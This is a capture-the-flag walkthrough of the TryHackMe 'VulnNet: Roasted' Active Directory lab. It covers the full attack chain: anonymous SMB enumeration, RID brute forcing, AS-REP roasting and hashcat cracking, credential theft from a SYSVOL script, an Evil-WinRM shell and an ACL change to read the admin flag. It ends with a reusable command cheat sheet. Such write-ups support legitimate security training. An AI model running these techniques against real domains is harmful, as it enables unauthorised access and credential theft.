# VulnNet: Roasted

Room: https://tryhackme.com/room/vulnnetroasted.md

VulnNet Entertainment quickly deployed another management instance on their very broad network...

VulnNet Entertainment just deployed a new instance on their network with the newly-hired system administrators. Being a security-aware company, they as always hired you to perform a penetration test, and see how system administrators are performing.

    Difficulty: Easy
    Operating System: Windows

This is a much simpler machine, do not overthink. You can do it by following common methodologies.

Note: It might take up to 6 minutes for this machine to fully boot.

Icon made by DinosoftLabs (opens in new tab) from www.flaticon.com

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/vulnnetroasted.md


## Summary

This room was a Windows Active Directory target. The path started with anonymous SMB access, which exposed business notes and gave enough information to build an initial username list. The guessed username format was wrong at first, so RID brute forcing was used to enumerate the real domain usernames.

From there, AS-REP roasting exposed a crackable hash for `t-skid`. The cracked credentials allowed authenticated access to `SYSVOL`, where a password reset script leaked credentials for `a-whitehat`. That account had WinRM access and enough rights to read the user flag and modify the ACL on the administrator flag file.

---

## Enumeration

I started with a full TCP port scan and service detection.

```bash
nmap -sV -p- 10.64.189.26
```

Important ports found:

```text
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  tcpwrapped
3268/tcp  open  ldap
3269/tcp  open  tcpwrapped
5985/tcp  open  http
9389/tcp  open  mc-nmf
```

The scan showed this was a Domain Controller:

```text
Domain: vulnnet-rst.local
Host: WIN-2BO8M1OE1M1
```

The key services were:

- DNS on `53`
- Kerberos on `88`
- LDAP on `389`
- SMB on `445`
- WinRM on `5985`

---

## DNS Troubleshooting

I tried to point `/etc/resolv.conf` at the Domain Controller:

```bash
echo "nameserver 10.64.189.26" > /etc/resolv.conf
```

This failed:

```text
-bash: /etc/resolv.conf: Operation not permitted
```

This was not a blocker. Instead of changing global DNS, I used tool-specific options such as:

```bash
GetNPUsers.py vulnnet-rst.local/ -dc-ip 10.64.189.26 -usersfile users.txt -no-pass
```

And for SMB, I connected directly to the IP.

This is a useful reminder that DNS issues can often be worked around by passing the DC IP directly to tools.

---

## SMB Enumeration

Anonymous SMB access was allowed.

```bash
smbclient -L //10.64.189.26 -N
```

Shares found:

```text
ADMIN$
C$
IPC$
NETLOGON
SYSVOL
VulnNet-Business-Anonymous
VulnNet-Enterprise-Anonymous
```

I also checked the host with CrackMapExec:

```bash
crackmapexec smb 10.64.189.26
```

This confirmed:

```text
domain:vulnnet-rst.local
signing:True
SMBv1:False
```

SMB signing being enabled meant SMB relay was unlikely to be the easy path.

Null and guest authentication worked:

```bash
crackmapexec smb 10.64.189.26 -u '' -p ''
crackmapexec smb 10.64.189.26 -u guest -p ''
```

---

## LDAP Check

The base LDAP query worked anonymously:

```bash
ldapsearch -x -H ldap://10.64.189.26 -s base namingcontexts
```

This returned:

```text
DC=vulnnet-rst,DC=local
CN=Configuration,DC=vulnnet-rst,DC=local
CN=Schema,CN=Configuration,DC=vulnnet-rst,DC=local
DC=DomainDnsZones,DC=vulnnet-rst,DC=local
DC=ForestDnsZones,DC=vulnnet-rst,DC=local
```

A full LDAP subtree query failed because a successful bind was required:

```bash
ldapsearch -x -H ldap://10.64.189.26 -b "DC=vulnnet-rst,DC=local"
```

Error:

```text
In order to perform this operation a successful bind must be completed
```

So LDAP became useful later once credentials were found.

---

## Anonymous Share Access

I connected to the business anonymous share:

```bash
smbclient //10.64.189.26/VulnNet-Business-Anonymous -N
```

Files found:

```text
Business-Manager.txt
Business-Sections.txt
Business-Tracking.txt
```

I downloaded them:

```text
mget *
```

Then I checked the enterprise anonymous share:

```bash
smbclient //10.64.189.26/VulnNet-Enterprise-Anonymous -N
```

Files found:

```text
Enterprise-Operations.txt
Enterprise-Safety.txt
Enterprise-Sync.txt
```

These files exposed names and some useful clues:

```text
Alexa Whitehat
Jack Goldenhand
Tony Skid
Johnny Leet
```

There were also phone number style values and themed words that looked like possible password material, but the first issue was finding the real username format.

---

## First Username Guess Failed

I initially built usernames in common formats like:

```text
alexa.whitehat
awhitehat
tony.skid
tskid
johnny.leet
jleet
```

Then I checked them with AS-REP style enumeration:

```bash
GetNPUsers.py vulnnet-rst.local/ -dc-ip 10.64.189.26 -usersfile users.txt -no-pass
```

Every result came back as:

```text
KDC_ERR_C_PRINCIPAL_UNKNOWN
```

That meant the guessed usernames did not exist in AD.

This was the first important troubleshooting point: the names were useful, but the username format was wrong.

---

## RID Brute Force for Real Users

Since null and guest SMB access worked, I used RID brute forcing to enumerate real domain users:

```bash
crackmapexec smb 10.64.189.26 -u guest -p '' --rid-brute
```

This returned the actual usernames:

```text
VULNNET-RST\enterprise-core-vn
VULNNET-RST\a-whitehat
VULNNET-RST\t-skid
VULNNET-RST\j-goldenhand
VULNNET-RST\j-leet
```

This confirmed the format was:

```text
first-initial-surname
```

I created a clean username list:

```bash
cat > real_users.txt << 'EOF'
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
EOF
```

---

## AS-REP Roasting

With the real usernames, I ran AS-REP roasting again:

```bash
GetNPUsers.py vulnnet-rst.local/ -dc-ip 10.64.189.26 -usersfile real_users.txt -no-pass
```

Most accounts required pre-authentication, but `t-skid` did not:

```text
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:4f451e...c575e8
```

I saved the hash to a file:

```bash
cat > t-skid.asrep << 'EOF'
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:4f451e...c575e8
EOF
```

Then cracked it with Hashcat mode `18200`:

```bash
hashcat -m 18200 t-skid.asrep /usr/share/wordlists/rockyou.txt --force
```

The password cracked successfully:

```text
t-skid:tj07...89*
```

---

## Validating t-skid

I validated the cracked credentials with SMB:

```bash
crackmapexec smb 10.64.189.26 -d vulnnet-rst.local -u t-skid -p 'tj07...89*'
```

This worked:

```text
[+] vulnnet-rst.local\t-skid:tj07...89*
```

WinRM did not work for this user:

```bash
crackmapexec winrm 10.64.189.26 -d vulnnet-rst.local -u t-skid -p 'tj07...89*'
```

Result:

```text
[-] vulnnet-rst.local\t-skid:tj07...89*
```

So `t-skid` had valid domain credentials, but not WinRM access.

---

## Authenticated SMB and SYSVOL

Using `t-skid`, I enumerated shares again:

```bash
crackmapexec smb 10.64.189.26 -d vulnnet-rst.local -u t-skid -p 'tj07...89*' --shares
```

This showed authenticated read access to `SYSVOL` and `NETLOGON`:

```text
NETLOGON READ
SYSVOL   READ
```

I connected to `SYSVOL`:

```bash
smbclient //10.64.189.26/SYSVOL -U 'vulnnet-rst.local/t-skid%tj07...89*'
```

Inside SYSVOL:

```text
vulnnet-rst.local
```

Then:

```text
cd vulnnet-rst.local
ls
```

This showed:

```text
DfsrPrivate
Policies
scripts
```

`DfsrPrivate` was denied, which is normal:

```text
NT_STATUS_ACCESS_DENIED
```

The useful folder was `scripts`.

---

## Finding ResetPassword.vbs

In the SYSVOL scripts directory, I found a file called:

```text
ResetPassword.vbs
```

Reading it revealed that it reset the password for `a-whitehat`:

```vb
strUserNTName = "a-whitehat"
strPassword = "bNdK...9ht"
```

The script also set:

```vb
objUser.Put "pwdLastSet", 0
```

That means the password may be expired or require changing at next logon. In this case, the leaked password still worked.

---

## Validating a-whitehat

I tested the leaked credentials:

```bash
crackmapexec smb 10.64.189.26 -d vulnnet-rst.local -u a-whitehat -p 'bNdK...9ht'
```

This worked and showed admin-style access:

```text
[+] vulnnet-rst.local\a-whitehat:bNdK...9ht (Pwn3d!)
```

Then I checked WinRM:

```bash
crackmapexec winrm 10.64.189.26 -d vulnnet-rst.local -u a-whitehat -p 'bNdK...9ht'
```

This also worked:

```text
[+] vulnnet-rst.local\a-whitehat:bNdK...9ht (Pwn3d!)
```

---

## WinRM Shell

I connected with Evil-WinRM:

```bash
evil-winrm -i 10.64.189.26 -u a-whitehat -p 'bNdK...9ht'
```

Troubleshooting note: I accidentally tried a different password first and got a WinRM authorization error when running a command.

```text
WinRM::WinRMAuthorizationError
```

The fix was simply to use the confirmed leaked password from the VBS script.

---

## User Flag

Inside the WinRM shell, I checked the users directory:

```powershell
dir C:\Users
```

Users found:

```text
a-whitehat
Administrator
enterprise-core-vn
Public
```

The `a-whitehat` profile was mostly empty, but `enterprise-core-vn` had the user flag:

```powershell
cd C:\Users\enterprise-core-vn\Desktop
dir
type user.txt
```

Flag:

```text
THM{726...4ed}
```

---

## System Flag ACL Issue

The administrator desktop had the system flag:

```powershell
cd C:\Users\Administrator\Desktop
dir
```

File found:

```text
system.txt
```

Trying to read it failed:

```powershell
type system.txt
```

Error:

```text
Access to the path 'C:\users\Administrator\Desktop\system.txt' is denied.
```

I checked the file ACL:

```powershell
icacls C:\Users\Administrator\Desktop\system.txt
```

The ACL showed only `SYSTEM` and `Administrator` had full access:

```text
NT AUTHORITY\SYSTEM:(F)
VULNNET-RST\Administrator:(F)
```

At this point, since `a-whitehat` had strong privileges, I granted the account access to the file.

```powershell
icacls C:\Users\Administrator\Desktop\system.txt /grant "VULNNET-RST\a-whitehat:F"
```

This succeeded:

```text
processed file: C:\Users\Administrator\Desktop\system.txt
Successfully processed 1 files; Failed processing 0 files
```

Then I read the flag:

```powershell
type C:\Users\Administrator\Desktop\system.txt
```

Flag:

```text
THM{16f...d4c}
```

---

## Attack Path Recap

The final path was:

```text
Anonymous SMB shares
RID brute force for real usernames
AS-REP roast t-skid
Crack t-skid hash
Use t-skid to read SYSVOL
Find ResetPassword.vbs
Recover a-whitehat credentials
WinRM as a-whitehat
Read user.txt from enterprise-core-vn
Modify ACL on system.txt
Read system.txt
```

---

## Useful Commands

### Full Port Scan

```bash
nmap -sV -p- 10.64.189.26
```

### SMB Share Enumeration

```bash
smbclient -L //10.64.189.26 -N
crackmapexec smb 10.64.189.26
```

### Anonymous Share Access

```bash
smbclient //10.64.189.26/VulnNet-Business-Anonymous -N
smbclient //10.64.189.26/VulnNet-Enterprise-Anonymous -N
```

### RID Brute Force

```bash
crackmapexec smb 10.64.189.26 -u guest -p '' --rid-brute
```

### AS-REP Roasting

```bash
GetNPUsers.py vulnnet-rst.local/ -dc-ip 10.64.189.26 -usersfile real_users.txt -no-pass
```

### Hash Cracking

```bash
hashcat -m 18200 t-skid.asrep /usr/share/wordlists/rockyou.txt --force
```

### Authenticated Share Enumeration

```bash
crackmapexec smb 10.64.189.26 -d vulnnet-rst.local -u t-skid -p 'tj07...89*' --shares
```

### SYSVOL Access

```bash
smbclient //10.64.189.26/SYSVOL -U 'vulnnet-rst.local/t-skid%tj07...89*'
```

### WinRM Access

```bash
evil-winrm -i 10.64.189.26 -u a-whitehat -p 'bNdK...9ht'
```

### ACL Check and Grant

```powershell
icacls C:\Users\Administrator\Desktop\system.txt
icacls C:\Users\Administrator\Desktop\system.txt /grant "VULNNET-RST\a-whitehat:F"
```

---

## Lessons Learned

- Anonymous SMB can still expose enough information to build a full AD attack path.
- Business notes may reveal names, but username formats should be confirmed through enumeration.
- RID brute forcing is very useful when null or guest SMB access is allowed.
- `GetNPUsers.py` can be used both for AS-REP roasting and confirming whether usernames exist.
- `SYSVOL` should always be checked after getting domain credentials.
- Scripts in `SYSVOL` can leak passwords, reset logic, or operational mistakes.
- WinRM access should be tested separately from SMB access.
- File ACLs can block flag access even when the file is visible.
- If the current account has the right privileges, modifying ACLs can be easier than spawning another shell.

---

## Short README Style Summary

VulnNet: Roasted is an Active Directory room where anonymous SMB access exposes business notes and user naming clues. The initial username guesses fail, so RID brute forcing is used to enumerate valid users. One account, `t-skid`, is AS-REP roastable and cracks with RockYou. The cracked credentials allow access to SYSVOL, where a password reset script leaks credentials for `a-whitehat`. That account has WinRM access and enough privileges to read the user flag and modify the ACL on the administrator flag file.
